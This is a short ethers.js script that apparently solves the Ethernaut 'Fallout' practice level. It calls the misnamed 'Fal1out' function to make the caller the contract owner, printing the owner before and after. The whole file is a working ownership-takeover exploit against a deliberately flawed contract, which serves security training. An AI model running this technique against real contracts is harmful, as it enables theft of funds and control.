import { ethers } from "ethers";


export default async function (providerUrl, ...args) {

  const contractAddress = ethers.getAddress(args[0]);
  const signerPrivateKey = args[1];

  const provider = new ethers.JsonRpcProvider(providerUrl);
  
  const FalloutRead = new ethers.Contract(
    contractAddress, 
    [
      "function owner() view returns (address)",
    ], 
    provider
  );

  console.log("Current owner:", await FalloutRead.owner());

  const signer = new ethers.Wallet(signerPrivateKey, provider);

  const FalloutWrite = new ethers.Contract(
    contractAddress,
    [
      "function owner() view returns (address)",
      "function Fal1out() external payable"
    ],
    signer
  )

  const tx = await FalloutWrite.Fal1out({
    value: ethers.parseEther("0")
  });
  await tx.wait();

  console.log("New owner:", await FalloutRead.owner());

}


